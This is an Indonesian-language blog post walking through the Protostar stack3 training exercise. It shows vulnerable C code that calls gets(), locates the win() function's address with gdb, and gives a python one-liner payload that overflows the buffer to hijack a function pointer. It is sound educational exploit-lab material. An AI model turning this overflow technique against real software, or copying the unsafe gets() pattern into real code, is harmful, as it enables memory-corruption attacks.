---
layout: post
title: "Protostar: stack3 "
date: 2020-07-06 20:05:03 +0700
categories: [reversing, protostar]
---

Melanjutkan ke stack3, seperti biasanya stack3 juga dapat ditemukan pada directory `/opt/protostar/bin`. Keterangan dan source code dapat ditemukan [disini](https://exploit-exercises.lains.space/protostar/stack3/). Mari kita awali dengan memeriksa berkas stack3 dengan utilitas `file`.

![memeriksa stack3 dengan file](/images/protostar-stack3-1.png)

Tidak berbeda dengan yang sebelumnya. Lanjut kita lihat source codenya.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Sepertinya tugas utamanya masih sama yaitu melakukan overflow pada buffer. Namun kali ini bukan hanya untuk merubah isi variable tapi juga untuk memanggil fungsi `win()`. Dalam menjelaskan konsep dan cara melakukan ini [CyberSecurityIPB](https://www.youtube.com/playlist?list=PLn8rJDl0kSc4iiwlZo8nVvM6T4mzf-xCU) memiliki playlist yang sangat bagus dan bisa ditonton [disini](https://www.youtube.com/playlist?list=PLn8rJDl0kSc4iiwlZo8nVvM6T4mzf-xCU). Selain itu [liveoverflow](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) juga memiliki playlist yang bagus [disini](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) namun dalam bahasa inggris.

Sebelumnya kita telah memahami bagaimana alur program jika dieksekusi secara runtut dari atas. Namun dalam kasus ini terdapat fungsi yang sifatnya dapat dipanggil dibagian manapun pada program, lalu bagaimana caranya hal itu bisa terjadi? Secara sederhana dalam pemanggilan fungsi proses pemanggilan diawali dengan menyimpan alamat memory dari pemanggil fungsi pada dasar `stack`. Selanjutnya setelah fungsi selesai dieksekusi pointer akan menunjuk pada dasar stack dan menuju alamat yang ada disana untuk kembali lagi ke pemanggil fungsi. Bagian inilah yang biasanya dimanfaatkan, dengan melakukan overflow buffer lalu menimpa alamat asli yang ada di dasar stack dengan alamat fungsi yang ingin di dituju.

Pertama - tama yang perlu diketahui ialah alamat dari fungsi **win()** pada memory. Kita akan menggunakan **gdb** untuk melakukan tugas ini.

```bash
gdb -q stack3
info function
```

output:
![menggunakan gdb pada stack3](/images/protostar-stack3-2.png)

Baris perintah pertama untuk meload stack3 ke gdb dengan mode quiet. Baris selanjutnya digunakan untuk menampilkan daftar fungsi yang ada / digunakan pada stack3 termasuk fungsi win() yang menjadi tujuan kita. Pada binary yang di strip, nama fungsi berbeda antara yang ada di source code dengan yang ada di binary. Itulah mengapa kita menjalankan utilitas file, untuk mengetahui secara pasti binary di strip atau tidak.

Kembali ke stack3, untuk mengetahui alamat dari fungsi win() kita dapat melakukan disassembly fungsi win() pada binary.

```bash
disas win
```

output:
![mencari alamat fungsi win](/images/protostar-stack3-3.png)
\*catatan: alamat fungsi juga dapat diketahui dengan menggunakan **objdump** dengan perintah `objdump -D stack3 | grep win`.

Alamat fungsi win terdapat pada sebelah kiri instruksi `push %ebp` atau pada syntax intel `push ebp`. Catat terlebih dahulu lalu keluar dari gdb dengan memasukkan perintah `q`. Fungsi win terdapat pada **0x08048424**, kita rapikan terlebih dahulu menjadi 08 04 84 24. Lalu kita cek karakter yang mewakili di manual ascii.

```bash
man ascii
```

output:
![man ascii](/images/protostar-stack3-4.png)

Berdasarkan manual, karakter yang mewakili 08, 04 termasuk pada karakter spesial seperti pada [stack2](/belajar-reversing-protostar-stack2). 84 tidak terdapat pada manual, terakhir 24 diwakili oleh \$. Kali ini kita akan menggunakan bantuan `python`. Jangan lupakan kalau protostar ini little endian.

```bash
python -c 'print("w" * 64 + "\x24\x84\x04\x08")' | ./stack3
```

Dengan menggunakan python kita dapat langsung menuliskan dengan menambahkan backslash (\\) dan karakter 'x'.

output:
![penyelesaian](/images/protostar-stack3-5.png)

Berhasil!
